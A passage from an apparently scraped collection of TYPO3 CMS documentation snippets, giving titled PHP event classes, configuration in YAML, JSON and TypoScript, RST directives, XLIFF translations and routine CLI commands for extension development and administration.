https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/CodeSnippets/Events/Core/Resource/GeneratePublicUrlForResourceEvent.rst.txt#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\nnamespace TYPO3\\CMS\\Core\\Resource\\Event;\n\nclass GeneratePublicUrlForResourceEvent {\n    public function getResource(): \\TYPO3\\CMS\\Core\\Resource\\ResourceInterface;\n    public function getStorage(): \\TYPO3\\CMS\\Core\\Resource\\ResourceStorage;\n    public function getDriver(): \\TYPO3\\CMS\\Core\\Resource\\Driver\\DriverInterface;\n    public function getPublicUrl(): ?string;\n    public function setPublicUrl(?string $publicUrl);\n}\n```\n\n----------------------------------------\n\nTITLE: Defining Extension Type in composer.json (System Extension)\nDESCRIPTION: This JSON snippet shows how to define the type of a system TYPO3 extension in the `composer.json` file. Setting the `type` to `typo3-cms-framework` indicates that it's a core framework extension.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ExtensionArchitecture/Concepts/SystemAndLocalExtensions.rst#2025-04-16_snippet_1\n\nLANGUAGE: json\nCODE:\n```\n{\n    \"name\": \"typo3/cms-core\",\n    \"type\": \"typo3-cms-framework\",\n    \"...\": \"...\"\n}\n```\n\n----------------------------------------\n\nTITLE: RST External Link Definition\nDESCRIPTION: RST markup defining an external link reference to the RequireJS discontinuation issue.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Backend/JavaScript/RequireJS/Dependency/Index.rst#2025-04-16_snippet_3\n\nLANGUAGE: rst\nCODE:\n```\n.. _discontinued: https://github.com/requirejs/requirejs/issues/1816\n```\n\n----------------------------------------\n\nTITLE: Using a Site Set as Dependency in YAML\nDESCRIPTION: This YAML configuration demonstrates how to include a site set as a dependency in a site configuration file.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/SiteHandling/SiteSets.rst#2025-04-16_snippet_3\n\nLANGUAGE: yaml\nCODE:\n```\nbase: 'https://example.com/'\nrootPageId: 1\ndependencies:\n  - my-vendor/my-set\n```\n\n----------------------------------------\n\nTITLE: Configuring Backend Logo in TYPO3\nDESCRIPTION: Global configuration option to customize the backend logo using TYPO3_CONF_VARS.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Backend/BackendModules/BackendGUI.rst#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\n$GLOBALS['TYPO3_CONF_VARS']['EXTENSIONS']['backend']['backendLogo']\n```\n\n----------------------------------------\n\nTITLE: Illustrating Slug Collision in Multi-Site Setup with Mount Points\nDESCRIPTION: This code snippet demonstrates a potential slug collision scenario in a multi-site setup with mount points. It shows how a mounted page and a regular page can have conflicting URLs.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/MountPoints/Index.rst#2025-04-16_snippet_4\n\nLANGUAGE: none\nCODE:\n```\nPage   Tree\n====== ====================\n\n1      Site 1: example.org\n2      └── More              <- mounted by page 5\n3          └── Imprint       <- page will never be reached via Site 2\n\n4      Site 2: company.example.org\n5      └── More              <- mount point page that is mounting page 2\n6      └── Imprint           <- slug manually configured to `more/imprint/`\n```\n\n----------------------------------------\n\nTITLE: Including RST Documentation Header\nDESCRIPTION: Standard RST documentation include directive and title formatting for a TYPO3 documentation chapter about service development.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Services/Developer/Index.rst#2025-04-16_snippet_0\n\nLANGUAGE: rst\nCODE:\n```\n.. include:: /Includes.rst.txt\n\n\n.. _services-developer:\n\n=================\nDeveloper's Guide\n=================\n\nThis chapter describes all you need to know to develop a new service,\nincluding advice to developing good services.\n\n\n.. toctree::\n   :titlesonly:\n\n   NewServiceType\n   Implementing\n   ServiceApi\n   ServiceRelatedApi\n```\n\n----------------------------------------\n\nTITLE: Performing Minor TYPO3 Extension Upgrade\nDESCRIPTION: Command to upgrade a specific extension to its latest minor version\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/Administration/Upgrade/UpgradingExtensions/Index.rst#2025-04-16_snippet_2\n\nLANGUAGE: bash\nCODE:\n```\ncomposer update vendor/packagename\n```\n\n----------------------------------------\n\nTITLE: Channel Configuration with Parameter Attribute in TYPO3\nDESCRIPTION: Example of assigning a custom channel to a logger using the Channel attribute at the parameter level in TYPO3. This overwrites any class-level channel configuration.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Logging/Logger/Index.rst#2025-04-16_snippet_3\n\nLANGUAGE: php\nCODE:\n```\n<?php\ndeclare(strict_types=1);\n\nnamespace MyVendor\\MyExtension\\Service;\n\nuse Psr\\Log\\LoggerInterface;\nuse TYPO3\\CMS\\Core\\Log\\Channel;\n\nclass MyClass\n{\n    private LoggerInterface $logger;\n\n    public function __construct(\n        #[Channel('security')]\n        LoggerInterface $logger\n    ) {\n        $this->logger = $logger;\n    }\n\n    public function doSomething(): void\n    {\n        $this->logger->info('Something happened');\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: XLIFF Translation Example with Approval Status\nDESCRIPTION: Example of an XLIFF translation unit showing the approved attribute usage for localization control in TYPO3.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/Configuration/Typo3ConfVars/SYS.rst#2025-04-16_snippet_5\n\nLANGUAGE: xml\nCODE:\n```\n<trans-unit id=\"label2\" approved=\"yes\">\n    <source>This is label #2</source>\n    <target>Ceci est le libellé no. 2</target>\n</trans-unit>\n```\n\n----------------------------------------\n\nTITLE: SanitizeFileNameEvent Class Definition with Methods\nDESCRIPTION: PHP class definition for SanitizeFileNameEvent in TYPO3 CMS Core Resource module. The class provides methods for getting and setting file names, accessing target folder, storage, and driver information during file indexing.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/CodeSnippets/Events/Core/Resource/SanitizeFileNameEvent.rst.txt#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\nnamespace TYPO3\\CMS\\Core\\Resource\\Event;\n\nclass SanitizeFileNameEvent\n{\n    public function getFileName(): string\n    {\n        // Returns the file name\n    }\n\n    public function setFileName(string $fileName)\n    {\n        // Sets the file name\n    }\n\n    public function getTargetFolder(): \\TYPO3\\CMS\\Core\\Resource\\Folder\n    {\n        // Returns the target folder\n    }\n\n    public function getStorage(): \\TYPO3\\CMS\\Core\\Resource\\ResourceStorage\n    {\n        // Returns the storage\n    }\n\n    public function getDriver(): \\TYPO3\\CMS\\Core\\Resource\\Driver\\DriverInterface\n    {\n        // Returns the driver\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Configuring Page Link Handler in TYPO3 TSconfig\nDESCRIPTION: Sets the page ID selector configuration for link handling in TCEMAIN, enabling specific page link selection behavior\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ExtensionArchitecture/FileStructure/Configuration/PageTsconfig.rst#2025-04-16_snippet_0\n\nLANGUAGE: typoscript\nCODE:\n```\nTCEMAIN.linkHandler.page.configuration.pageIdSelector.enabled = 1\n```\n\n----------------------------------------\n\nTITLE: ModifyInfoModuleContentEvent Class Definition with Methods\nDESCRIPTION: PHP class that defines the ModifyInfoModuleContentEvent for TYPO3 CMS info module. Contains methods for managing module access, handling requests, and manipulating header/footer content.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/CodeSnippets/Events/Info/ModifyInfoModuleContentEvent.rst.txt#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\nnamespace TYPO3\\CMS\\Info\\Controller\\Event;\n\nclass ModifyInfoModuleContentEvent {\n    public function hasAccess(): bool;\n    public function getRequest(): \\Psr\\Http\\Message\\ServerRequestInterface;\n    public function getCurrentModule(): \\TYPO3\\CMS\\Backend\\Module\\ModuleInterface;\n    public function getModuleTemplate(): \\TYPO3\\CMS\\Backend\\Template\\ModuleTemplate;\n    public function setHeaderContent(string $content);\n    public function addHeaderContent(string $content);\n    public function getHeaderContent(): string;\n    public function setFooterContent(string $content);\n    public function addFooterContent(string $content);\n    public function getFooterContent(): string;\n}\n```\n\n----------------------------------------\n\nTITLE: Referencing the AfterExtensionStaticDatabaseContentHasBeenImportedEvent in PHP\nDESCRIPTION: This snippet shows the fully qualified namespace of the PSR-14 event that has been removed in TYPO3 CMS 13.0. Developers need to migrate to using the PackageInitializationEvent instead.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Events/Events/ExtensionManager/AfterExtensionDatabaseContentHasImportedEvent.rst#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\n\\TYPO3\\CMS\\Extensionmanager\\Event\\AfterExtensionStaticDatabaseContentHasBeenImportedEvent\n```\n\n----------------------------------------\n\nTITLE: Defining Table of Contents for FAL Architecture Documentation in reStructuredText\nDESCRIPTION: This snippet defines the table of contents for the FAL architecture documentation using reStructuredText directives. It includes sections for Overview, Folders, Database, Components, and Events.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Fal/Architecture/Index.rst#2025-04-16_snippet_0\n\nLANGUAGE: reStructuredText\nCODE:\n```\n..  toctree::\n\n    Overview\n    Folders\n    Database\n    Components\n    Events\n```\n\n----------------------------------------\n\nTITLE: Defining AfterFileMetaDataUpdatedEvent Class in TYPO3 Core Resource\nDESCRIPTION: This PHP class definition outlines the AfterFileMetaDataUpdatedEvent that is fired after file metadata has been updated. The class provides methods to access the file UID, metadata UID, and the updated record data.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/CodeSnippets/Events/Core/Resource/AfterFileMetaDataUpdatedEvent.rst.txt#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\nnamespace TYPO3\\CMS\\Core\\Resource\\Event;\n\nclass AfterFileMetaDataUpdatedEvent\n{\n    // This event is fired once metadata of a file was updated, in order to update custom metadata fields accordingly\n\n    public function getFileUid(): int\n    {\n        // Returns the file UID\n    }\n\n    public function getMetaDataUid(): int\n    {\n        // Returns the metadata UID\n    }\n\n    public function getRecord(): array\n    {\n        // Returns the record data\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Rendering Figure Directive in reST Documentation\nDESCRIPTION: ReStructuredText directive for displaying a screenshot of a haiku creation form with specific styling and caption.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/Images/AutomaticScreenshots/Examples/EditLinks/EditLinksNew.rst.txt#2025-04-16_snippet_0\n\nLANGUAGE: reST\nCODE:\n```\n.. figure:: /Images/AutomaticScreenshots/Examples/EditLinks/EditLinksNew.png\n   :class: with-shadow\n\n   Form for creating a new haiku with pre-filled title and season and restricted columns\n```\n\n----------------------------------------\n\nTITLE: Updating Reference Index via CLI in Composer-based TYPO3 Installation\nDESCRIPTION: This command updates the reference index for a Composer-based TYPO3 installation. It should be executed in the root folder of the project. This method is recommended to avoid timeouts, especially on larger instances.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/Administration/Upgrade/Major/PreupgradeTasks/ReferenceIndex.rst.txt#2025-04-16_snippet_0\n\nLANGUAGE: bash\nCODE:\n```\nvendor/bin/typo3 referenceindex:update\n```\n\n----------------------------------------\n\nTITLE: Defining ModifyQueryForLiveSearchEvent Class Interface in TYPO3\nDESCRIPTION: Defines the interface for a PSR-14 event class that enables modification of the QueryBuilder instance used in TYPO3's live search functionality. Provides methods to access the QueryBuilder and table name.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/CodeSnippets/Events/Backend/ModifyQueryForLiveSearchEvent.rst.txt#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\nnamespace TYPO3\\CMS\\Backend\\Search\\Event;\n\nclass ModifyQueryForLiveSearchEvent\n{\n    public function getQueryBuilder(): \\TYPO3\\CMS\\Core\\Database\\Query\\QueryBuilder;\n    public function getTableName(): string;\n}\n```\n\n----------------------------------------\n\nTITLE: Custom Language XLIFF File for Swiss German\nDESCRIPTION: XML structure for a custom XLIFF translation file for Swiss German language in TYPO3. This example translates the language name label.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Localization/ManagingTranslations.rst#2025-04-16_snippet_8\n\nLANGUAGE: xml\nCODE:\n```\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<xliff xmlns=\"urn:oasis:names:tc:xliff:document:1.2\" version=\"1.2\">\n    <file source-language=\"en\" target-language=\"gsw_CH\" datatype=\"plaintext\" original=\"EXT:setup/Resources/Private/Language/locallang.xlf\">\n        <body>\n            <trans-unit id=\"lang_gsw_CH\" approved=\"yes\">\n                <source>Swiss German</source>\n                <target>Schwiizertüütsch</target>\n            </trans-unit>\n        </body>\n    </file>\n</xliff>\n```\n\n----------------------------------------\n\nTITLE: Validating Postal Code with RegularExpression in PHP\nDESCRIPTION: Example showing how to validate a 5-digit postal code using the RegularExpression validator with a custom error message.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ExtensionArchitecture/Extbase/Reference/Validation/Validators/Index.rst#2025-04-16_snippet_10\n\nLANGUAGE: php\nCODE:\n```\nuse TYPO3\\CMS\\Extbase\\Annotation\\Validate;\n\nclass AddressForm\n{\n    #[Validate([\n        'validator' => 'RegularExpression',\n        'options' => [\n            'regularExpression' => '/^\\d{5}$/',\n            'message' => 'Bitte eine gültige Postleitzahl eingeben.'\n        ]\n    ])]\n    public string $postalCode = '';\n}\n```\n\n----------------------------------------\n\nTITLE: Template Migration for Fluid 4.0\nDESCRIPTION: Diff showing migration changes required for EXT:my_extension/Resources/Private/Templates/MyTemplate.html when updating to Fluid 4.0.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Fluid/Syntax.rst#2025-04-16_snippet_4\n\nLANGUAGE: diff\nCODE:\n```\n..  literalinclude:: _Syntax/_MyTemplate.diff\n    :caption: EXT:my_extension/Resources/Private/Templates/MyTemplate.html (diff)\n```\n\n----------------------------------------\n\nTITLE: Defining Post Model Class with Related Posts in TYPO3 CMS (PHP)\nDESCRIPTION: This code snippet defines the Post class for a blog example in TYPO3 CMS. It extends AbstractEntity and includes a public property 'relatedPosts' using ObjectStorage to store related Post objects.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/CodeSnippets/Extbase/Annotation/Lazy.rst.txt#2025-04-16_snippet_0\n\nLANGUAGE: PHP\nCODE:\n```\nuse TYPO3\\CMS\\Extbase\\Persistence\\ObjectStorage;\n\nclass Post extends AbstractEntity\n{\n    /**\n     * @var ObjectStorage<Post>\n     */\n    public ObjectStorage $relatedPosts;\n}\n```\n\n----------------------------------------\n\nTITLE: Defining BeforeFileDeletedEvent Class - PHP\nDESCRIPTION: PHP class definition for BeforeFileDeletedEvent in TYPO3 CMS Core Resource system. The class provides a getFile() method that returns a FileInterface object representing the file about to be deleted. This event allows listeners to perform cleanup operations before file deletion.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/CodeSnippets/Events/Core/Resource/BeforeFileDeletedEvent.rst.txt#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\nnamespace TYPO3\\CMS\\Core\\Resource\\Event;\n\nclass BeforeFileDeletedEvent\n{\n    public function getFile(): \\TYPO3\\CMS\\Core\\Resource\\FileInterface\n    {\n        // Implementation details not shown\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Setting Group Home Path Configuration in TYPO3\nDESCRIPTION: Configures the group home path in TYPO3 by setting the groupHomePath global configuration variable. Similar to user home paths, it consists of a storage ID and a relative path.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Backend/AccessControl/MoreAboutFileMounts/Index.rst#2025-04-16_snippet_1\n\nLANGUAGE: php\nCODE:\n```\n$GLOBALS['TYPO3_CONF_VARS']['BE']['groupHomePath'] = '1:groups/';\n```\n\n----------------------------------------\n\nTITLE: Visualizing TYPO3 Translation Workflow with ASCII Flowchart\nDESCRIPTION: This text-based flowchart illustrates the four-step translation workflow for TYPO3, showing how content flows from GitHub repositories to Crowdin.com for translation, through the Crowdin Bridge for processing, and finally to the Translation Server for distribution to TYPO3 installations.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Localization/TranslationServer/Crowdin/Workflow.rst#2025-04-16_snippet_0\n\nLANGUAGE: text\nCODE:\n```\n  +--------------+                   +----------------+\n  |  1) GitHub   |                   | 2) Crowdin.com |\n  |--------------|                   |----------------|\n  |              |  Automated Sync   |- Translate     |\n  | TYPO3 Core   |+----------------> |- Proofread     |\n  |  and         |                   |                |\n  | Extensions   |                   | in all         |\n  |              |                   | languages      |\n  +--------------+                   +----------------+\n                                            ^\n                                            |\n    +---------------------------------------+\n    |Triggered via GitHub actions\n    v\n  +-------------------+                 +-----------------------+\n  | 3) Crowdin Bridge |                 | 4) Translation Server |\n  |-------------------|                 |-----------------------|\n  |- Build projects   |                 |- Serves l10n zip      |\n  |- Download         |     rsync to    |  files, requested     |\n  |  translations     |+--------------->|  by TYPO3 sites       |\n  |- Create zips      |                 |- Hosts status page    |\n  |- Status pages     |                 +-----------------------+\n  +-------------------+\n```\n\n----------------------------------------\n\nTITLE: XML Country Translation File - German\nDESCRIPTION: XML language file containing German translations for the custom country\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Events/Events/Core/Country/BeforeCountriesEvaluatedEvent.rst#2025-04-16_snippet_3\n\nLANGUAGE: xml\nCODE:\n```\n<?xml version=\"1.0\" encoding=\"utf-8\" standalone=\"yes\"?>\n<xliff version=\"1.2\">\n    <file source-language=\"en\" target-language=\"de\" datatype=\"plaintext\" original=\"messages\">\n        <header/>\n        <body>\n            <trans-unit id=\"XX\" resname=\"XX\">\n                <source>Magic Kingdom</source>\n                <target>Zauberreich</target>\n            </trans-unit>\n        </body>\n    </file>\n</xliff>\n```\n\n----------------------------------------\n\nTITLE: Implementing ModifyLinkHandlersEvent Listener in TYPO3 CMS\nDESCRIPTION: This code snippet demonstrates how to create an event listener for the ModifyLinkHandlersEvent in TYPO3 CMS. It shows the basic structure of the listener class and the __invoke method that handles the event.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Events/Events/Backend/ModifyLinkHandlersEvent.rst#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\n<?php\ndeclare(strict_types=1);\n\nnamespace MyVendor\\MyExtension\\Backend\\EventListener;\n\nuse TYPO3\\CMS\\Backend\\Controller\\Event\\ModifyLinkHandlersEvent;\n\nfinal class MyEventListener\n{\n    public function __invoke(ModifyLinkHandlersEvent $event): void\n    {\n        $linkHandlers = $event->getLinkHandlers();\n        // Modify $linkHandlers array here\n        $event->setLinkHandlers($linkHandlers);\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: RST Index Entries for Doctrine\nDESCRIPTION: RST index directives for Doctrine and database-related terms\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Database/Introduction/Index.rst#2025-04-16_snippet_2\n\nLANGUAGE: RST\nCODE:\n```\n..  index::\n    ! Doctrine\n    Doctrine; DBAL\n    Database; Abstraction layer\n    Database; DBAL\n    DBMS\n```\n\n----------------------------------------\n\nTITLE: Setting User Home Path Configuration in TYPO3\nDESCRIPTION: Configures the user home path in TYPO3 by setting the userHomePath global configuration variable. The value consists of a storage ID (1) followed by a colon and the relative path ('user_homes/').\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Backend/AccessControl/MoreAboutFileMounts/Index.rst#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\n$GLOBALS['TYPO3_CONF_VARS']['BE']['userHomePath'] = '1:user_homes/';\n```\n\n----------------------------------------\n\nTITLE: ReStructuredText Documentation Headers\nDESCRIPTION: ReStructuredText directives for document structure and navigation, including section headers and includes\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/Administration/UserManagement/Groups/GroupPermissions.rst#2025-04-16_snippet_0\n\nLANGUAGE: rst\nCODE:\n```\n..  include:: /Includes.rst.txt\n..  _permissions:\n..  _setting-up-user-permissions:\n\n=================================\nSetting up user group permissions\n=================================\n```\n\n----------------------------------------\n\nTITLE: Generated Directory Structure for Backend Controller\nDESCRIPTION: Shows the directory structure and files created after running the backend controller make command, with new or modified files marked with an asterisk.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ExtensionArchitecture/Tutorials/Kickstart/Make/BackendController.rst#2025-04-16_snippet_2\n\nLANGUAGE: text\nCODE:\n```\n$ tree src/extensions\n└── my-test\n    ├── Classes\n    |   └── Backend (*)\n    |   |   └── Controller (*)\n    |   |   |   └── MyBackendController.php (*)\n    ├── Configuration\n    |   ├── Backend (*)\n    |   |   └── Routes.php (*)\n    |   └── Services.yaml (*)\n    ├── composer.json\n    └── ext_emconf.php\n```\n\n----------------------------------------\n\nTITLE: Implementing Tea Domain Model Class in TYPO3\nDESCRIPTION: Defines a Tea entity class extending AbstractEntity with validated properties for title, description, and image. Uses Extbase annotations for validation rules and lazy loading configuration. The class represents a tea flavor in the system.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/CodeSnippets/Tutorials/Tea/Classes/Domain/Model/TeaProperties.rst.txt#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\nuse TYPO3\\CMS\\Extbase\\Annotation as Extbase;\nuse TYPO3\\CMS\\Extbase\\Domain\\Model\\FileReference;\nuse TYPO3\\CMS\\Extbase\\DomainObject\\AbstractEntity;\nuse TYPO3\\CMS\\Extbase\\Persistence\\Generic\\LazyLoadingProxy;\n\n/**\n * This class represents a tea (flavor), e.g., \"Earl Grey\".\n */\nclass Tea extends AbstractEntity\n{\n    /**\n     * @Extbase\\Validate(\"StringLength\", options={\"maximum\": 255})\n     * @Extbase\\Validate(\"NotEmpty\")\n     */\n    protected string $title = '';\n\n    /**\n     * @Extbase\\Validate(\"StringLength\", options={\"maximum\": 2000})\n     */\n    protected string $description = '';\n\n    /**\n     * @var FileReference|null\n     * @phpstan-var FileReference|LazyLoadingProxy|null\n     * @Extbase\\ORM\\Lazy\n     */\n    protected $image;\n}\n```\n\n----------------------------------------\n\nTITLE: Defining Text Identifiers in TYPO3 Typoscript\nDESCRIPTION: This snippet shows how to define text identifiers using the TEXT object in TYPO3 Typoscript. The first identifier \"myIdentifier\" is assigned a static value of \"Hello world\", and a second identifier \"myOtherIdentifier\" is defined in a similar way. This serves as an example of how to use the TEXT object for simple variable definitions.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/CodeSnippets/TypoScriptSyntax/OperatorCopy1.rst.txt#2025-04-16_snippet_0\n\nLANGUAGE: typoscript\nCODE:\n```\nmyIdentifier = TEXT\nmyIdentifier.value = Hello world\nmyOtherIdentifier = TEXT\nmyOtherIdentifier.value = Hello world\n```\n\n----------------------------------------\n\nTITLE: Accessing TYPO3 Configuration Variables in PHP\nDESCRIPTION: The TYPO3_CONF_VARS array is a key component of TYPO3, containing numerous configuration options for the system. These values are accessible through admin tools for installation-wide configuration. The array is defined in DefaultConfiguration.php and allows further examination and modification through various TYPO3 modules.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/Configuration/GlobalVariables.rst#2025-04-16_snippet_0\n\n\n\n----------------------------------------\n\nTITLE: Backend Module Key PHP Example\nDESCRIPTION: Example of defining a backend module key with recommended naming conventions\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ExtensionArchitecture/BestPractises/NamingConventions.rst#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\n\n```\n\n----------------------------------------\n\nTITLE: Getting Metadata Record in AfterFileMetaDataCreatedEvent in PHP\nDESCRIPTION: Method to retrieve the complete metadata record that was created. Returns an array containing all metadata fields and their values.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/CodeSnippets/Events/Core/Resource/AfterFileMetaDataCreatedEvent.rst.txt#2025-04-16_snippet_2\n\nLANGUAGE: php\nCODE:\n```\npublic function getRecord(): array\n```\n\n----------------------------------------\n\nTITLE: RST Directive Inclusion\nDESCRIPTION: RST directives for including external file and setting up index entries for database-related terms\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Database/Introduction/Index.rst#2025-04-16_snippet_0\n\nLANGUAGE: RST\nCODE:\n```\n..  include:: /Includes.rst.txt\n..  index::\n    Relational database management system\n    see: RDBMS; Relational database management system\n    MySQL\n    MariaDB\n    PostgreSQL\n    SQLite\n```\n\n----------------------------------------\n\nTITLE: Displaying File Mount Assignment Image in RST\nDESCRIPTION: ReStructuredText directive for displaying a screenshot showing file mount assignment in TYPO3 CMS. The image shows how a file mount is assigned to the Editors group and includes styling for shadow effect.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/Images/AutomaticScreenshots/AccessControl/AssignFilemount.rst.txt#2025-04-16_snippet_0\n\nLANGUAGE: rst\nCODE:\n```\n.. figure:: /Images/AutomaticScreenshots/AccessControl/AssignFilemount.png\n   :class: with-shadow\n\n   The file mount is assigned to the \"Editors\" group\n```\n\n----------------------------------------\n\nTITLE: Configuring Navigation and Including External Content in reStructuredText\nDESCRIPTION: This snippet sets up the navigation title and includes an external file for common definitions. It also defines the main heading for the TYPO3 administration section.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/Administration/Index.rst#2025-04-16_snippet_0\n\nLANGUAGE: reStructuredText\nCODE:\n```\n:navigation-title: Administration\n..  include:: /Includes.rst.txt\n..  _administration:\n\n====================\nTYPO3 administration\n====================\n```\n\n----------------------------------------\n\nTITLE: Listing Available Commands in TYPO3 (Composer-based)\nDESCRIPTION: Shows how to list all available console commands in a Composer-based TYPO3 installation.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/CommandControllers/Index.rst#2025-04-16_snippet_0\n\nLANGUAGE: bash\nCODE:\n```\nvendor/bin/typo3\n```\n\n----------------------------------------\n\nTITLE: Using AfterTypoScriptDeterminedEvent in TYPO3 Frontend\nDESCRIPTION: The AfterTypoScriptDeterminedEvent class provides access to the FrontendTypoScript object after it has been calculated. This event allows listeners to read TypoScript conditions but not modify them.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Events/Events/Frontend/AfterTypoScriptDeterminedEvent.rst#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\nnamespace TYPO3\\CMS\\Frontend\\Event;\n\nuse TYPO3\\CMS\\Core\\TypoScript\\FrontendTypoScript;\n\n/**\n * Event dispatched after FrontendTypoScript has been determined.\n */\nfinal class AfterTypoScriptDeterminedEvent\n{\n    public function __construct(\n        private readonly FrontendTypoScript $typoScript,\n    ) {\n    }\n\n    public function getTypoScript(): FrontendTypoScript\n    {\n        return $this->typoScript;\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Copying Identifier Values in TYPO3 Typoscript\nDESCRIPTION: This snippet demonstrates how to copy the value of one identifier to another in TYPO3 Typoscript. It shows that the second identifier \"myOtherIdentifier\" can reference the first identifier \"myIdentifier\" with the use of the less than operator '<', effectively copying the value.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/CodeSnippets/TypoScriptSyntax/OperatorCopy1.rst.txt#2025-04-16_snippet_1\n\nLANGUAGE: typoscript\nCODE:\n```\nmyIdentifier = TEXT\nmyIdentifier.value = Hello world\nmyOtherIdentifier < myIdentifier\n```\n\n----------------------------------------\n\nTITLE: Enabling Apache Modules in http.conf\nDESCRIPTION: Demonstrates how to enable required Apache modules by uncommenting the LoadModule directives in the http.conf file. This is necessary for proper URL handling in TYPO3.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/Administration/Troubleshooting/WebServer.rst#2025-04-16_snippet_0\n\nLANGUAGE: none\nCODE:\n```\n#LoadModule expires_module modules/mod_expires.so\n#LoadModule rewrite_module modules/mod_rewrite.so\n```\n\n----------------------------------------\n\nTITLE: RST External Link Definition\nDESCRIPTION: RST syntax for defining an external link reference to Crowdin's website.\nSOURCE: 